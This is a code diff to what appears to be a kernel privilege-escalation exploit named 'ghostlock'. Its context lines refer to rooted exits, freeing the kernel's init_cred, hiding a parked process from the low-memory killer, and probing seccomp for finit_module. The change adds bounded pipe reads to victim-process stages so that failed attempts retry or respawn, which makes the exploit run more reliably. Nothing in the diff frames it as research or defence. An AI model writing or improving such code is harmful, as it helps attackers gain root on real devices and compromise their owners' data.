@@ -10,8 +10,19 @@
 #include "support/native_resource.hpp"
 
 #include <array>
+#include <poll.h>
 
 namespace ghostlock::session::victim {
+    /* Bounded probe read: a victim that stops answering (killed by the vendor
+     * probe, or wedged by an out-of-contract write) must fail the verify and
+     * let retry_write_stage refire/respawn instead of parking the worker on a
+     * dead pipe until the app-level timeout kills the whole run. */
+    static bool read_u32_timeout(int fd, uint32_t *out, int timeout_ms) {
+        struct pollfd pfd = {.fd = fd, .events = POLLIN, .revents = 0};
+        if (poll(&pfd, 1, timeout_ms) != 1) return false;
+        return read(fd, out, sizeof(*out)) == static_cast<ssize_t>(sizeof(*out));
+    }
+
     /* rooted exits kfree the static init_cred (w2 stores it with no
  * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
     static void park_child_process_forever(void) {
@@ -213,8 +224,7 @@ namespace ghostlock::session::victim {
         if (write(stage->pipes.cmd_write.get(), "C", 1) != 1) return 0;
 
         uint32_t child_uid = 9999;
-        if (read(stage->pipes.uid_read.get(), &child_uid, sizeof(child_uid)) !=
-            static_cast<ssize_t>(sizeof(child_uid))) {
+        if (!read_u32_timeout(stage->pipes.uid_read.get(), &child_uid, 3000)) {
             return 0;
         }
         pr_info("child uid = %u\n", child_uid);
@@ -227,9 +237,8 @@ namespace ghostlock::session::victim {
         auto *stage = static_cast<struct w2_stage_context *>(context);
         if (write(stage->pipes.cmd_write.get(), "F", 1) != 1) return 0;
 
-        uint32_t code = 0;
-        if (read(stage->pipes.uid_read.get(), &code, sizeof(code)) !=
-            static_cast<ssize_t>(sizeof(code))) {
+        uint32_t code = 0xffffffff;
+        if (!read_u32_timeout(stage->pipes.uid_read.get(), &code, 3000)) {
             return 0;
         }
         pr_info("seccomp finit_module probe = 0x%x\n", code);
@@ -249,8 +258,7 @@ namespace ghostlock::session::victim {
         if (write(stage->pipes.cmd_write.get(), "M", 1) != 1) return 0;
 
         uint32_t report = 0;
-        if (read(stage->pipes.uid_read.get(), &report, sizeof(report)) !=
-            static_cast<ssize_t>(sizeof(report))) {
+        if (!read_u32_timeout(stage->pipes.uid_read.get(), &report, 3000)) {
             return 0;
         }
         size_t len = (report >> 8) & 0xff;
